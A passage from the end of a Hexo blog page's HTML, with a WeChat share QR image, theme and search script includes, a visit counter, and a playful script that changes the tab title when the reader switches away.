ZePGuShw7T1NX4KHh4e3tfwuug2Gb3Kv4nGZPHw8PCO8TZhRHeHBJzf+WDWgoeHh9fUrjeUyMnnJ8txPDw8vIr3B0xQfYKpysXxAAAAAElFTkSuQmCC" alt="微信分享二维码">
</div>




    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
<script>
var BLOG = { ROOT: '/', SHARE: true, REWARD: true };


</script>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>


<div class="search-panel" id="search-panel">
    <ul class="search-result" id="search-result"></ul>
</div>
<template id="search-tpl">
<li class="item">
    <a href="{path}" class="waves-block waves-effect">
        <div class="title ellipsis" title="{title}">{title}</div>
        <div class="flex-row flex-middle">
            <div class="tags ellipsis">
                {tags}
            </div>
            <time class="flex-col time">{date}</time>
        </div>
    </a>
</li>
</template>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>






<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>



<script>
(function() {
    var OriginTitile = document.title, titleTime;
    document.addEventListener('visibilitychange', function() {
        if (document.hidden) {
            document.title = '死鬼去哪里了！';
            clearTimeout(titleTime);
        } else {
            document.title = '(つェ⊂)咦!又好了!';
            titleTime = setTimeout(function() {
                document.title = OriginTitile;
            },2000);
        }
    });
})();
</script>



</body>
</html>
